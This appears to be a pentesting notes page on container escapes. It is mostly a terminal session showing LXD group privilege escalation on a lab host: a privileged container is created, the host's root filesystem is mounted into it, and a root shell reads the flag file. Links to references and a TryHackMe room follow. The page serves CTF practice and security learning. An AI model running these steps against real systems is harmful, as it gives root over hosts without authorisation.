# Container


## Docker Container

## LXD/LXC

[distrobuilder](https://github.com/lxc/distrobuilder): System container image builder for LXC and LXD

Import linux container image and exploit host
```
john@exploitable:/tmp$ ls
alpine.yaml
lxd.tar.xz
rootfs.squashfs

john@exploitable:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 923442a81c422e888b04846489e5e4bd9984bcd2e4e7798c4682

john@exploitable:/tmp$ lxc init alpine -c security.privileged=true
Creating the container
Container name is: faithful-mastodon
john@exploitable:/tmp$

john@exploitable:/tmp$ lxc init alpine -c security.privileged=true
Creating the container
Container name is: faithful-mastodon
john@exploitable:/tmp$ lxc config device add faithful-mastodon container disk source=/ path=/mnt recursive=true
Device container added to faithful-mastodon
john@exploitable:/tmp$ lxc start faithful-mastodon
john@exploitable:/tmp$ lxc exec faithful-mastodon -- /bin/bash
john@exploitable:/tmp$ lxc exec faithful-mastodon /bin/bash
john@exploitable:/tmp$ lxc exec faithful-mastodon /bin/sh
~ # whoami
root
~ # pwd
/root

~ # cat /root/root.txt
cat: can't open '/root/root.txt': No such file or directory

~ # ls /mnt
bin             etc             lib             mnt             run             swap.img        var
boot            home            lib64           opt             sbin            sys             vmlinuz
cdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old
dev             initrd.img.old  media           root            srv             usr
~ # ls /mnt/root/
root.txt
~ # cat /mnt/root/root.txt
2exxxxxxxxxxxxxxxxxxxxxxxxxxxxfc
~ #
```


## Reference

[Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

[Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)

## Practice

[THM | Gaming Server](https://tryhackme.com/room/gamingserver): Exploit LXD container to get root flag
